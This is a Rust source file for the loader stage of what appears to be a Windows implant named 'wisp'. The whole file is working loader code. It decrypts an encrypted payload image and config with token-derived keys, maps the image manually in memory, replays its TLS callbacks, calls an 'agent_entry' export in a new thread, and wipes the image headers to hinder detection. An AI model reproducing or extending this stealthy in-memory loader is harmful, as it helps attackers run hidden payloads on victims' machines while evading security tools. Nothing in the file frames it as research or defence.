// Loader image body (windows). Entry point contract:
//
//	run_image(core_art_ptr, core_art_len, token_ptr, token_len) -> 0 on success
//
// `core_art` is mutated in place (section + config decryption); after this
// returns, the caller may (and should) scrub the buffer.
use std::ffi::c_void;
use std::mem;
use std::ptr;

use wisp_staged::{cfg_key, core_key};

#[link(name = "kernel32")]
extern "system" {
    fn CreateThread(
        attr: *mut c_void,
        stack: usize,
        start: extern "system" fn(*mut c_void) -> u32,
        param: *mut c_void,
        flags: u32,
        tid: *mut u32,
    ) -> *mut c_void;
    fn CloseHandle(h: *mut c_void) -> i32;
    fn ExitProcess(code: u32) -> !;
}

struct StartParams {
    cfg: *const u8,
    cfg_len: usize,
    base: usize,
    run: extern "system" fn(*const u8, usize, usize) -> u32,
    loader: *mut wisp_map::MappedImage,
}

extern "system" fn core_thread(p: *mut c_void) -> u32 {
    let s = unsafe { Box::from_raw(p as *mut StartParams) };
    let img = unsafe { &*s.loader };
    // The OS would fire the image's TLS callbacks at thread start; manual
    // mapping means nobody does, so replay them here.
    wisp_map::tls_notify(img, 2 /* DLL_THREAD_ATTACH */);
    let rc = (s.run)(s.cfg, s.cfg_len, s.base);
    // The host process lives exactly as long as the core does.
    unsafe { ExitProcess(rc) }
}

#[no_mangle]
pub extern "system" fn run_image(
    core_art: *mut u8,
    core_art_len: usize,
    token: *const u8,
    token_len: usize,
) -> i32 {
    if core_art.is_null() || token.is_null() || core_art_len == 0 || token_len == 0 {
        return 1;
    }
    let art = unsafe { std::slice::from_raw_parts_mut(core_art, core_art_len) };
    let tok = unsafe { std::slice::from_raw_parts(token, token_len) };
    let Ok(token_str) = std::str::from_utf8(tok) else {
        eprintln!("loader: token is not utf-8");
        return 1;
    };
    match unsafe { run(art, token_str) } {
        Ok(()) => 0,
        Err(e) => {
            eprintln!("loader: {e}");
            2
        }
    }
}

unsafe fn run(art: &mut [u8], token: &str) -> Result<(), String> {
    let (core_len, cfg_ct) = wisp_staged::split_core_art(art)?;
    let mut cfg = cfg_ct.to_vec();
    wisp_staged::crypt_cfg(&mut cfg, &cfg_key(token));

    let core_img = &mut art[..core_len];
    wisp_staged::crypt_sections(core_img, &core_key(token))?;

    let img = Box::new(wisp_map::map_image(core_img)?);
    let _ = wisp_map::call_entry(&img);
    wisp_map::tls_notify(&img, 1 /* DLL_PROCESS_ATTACH */);
    let run_ptr = wisp_map::resolve_export(&img, "agent_entry")?;
    let run: extern "system" fn(*const u8, usize, usize) -> u32 =
        mem::transmute(run_ptr);
    wisp_map::wipe_headers(&img);

    // The config must outlive this call: hand a stable copy to the thread.
    let cfg_box = cfg.into_boxed_slice();
    let cfg_len = cfg_box.len();
    let cfg_ptr = Box::into_raw(cfg_box) as *const u8;

    let params = Box::into_raw(Box::new(StartParams {
        cfg: cfg_ptr,
        cfg_len,
        base: img.base as usize,
        run,
        loader: Box::into_raw(img),
    }));
    let h = CreateThread(ptr::null_mut(), 0, core_thread, params as *mut c_void, 0, ptr::null_mut());
    if h.is_null() {
        return Err("CreateThread failed".into());
    }
    CloseHandle(h);
    Ok(())
}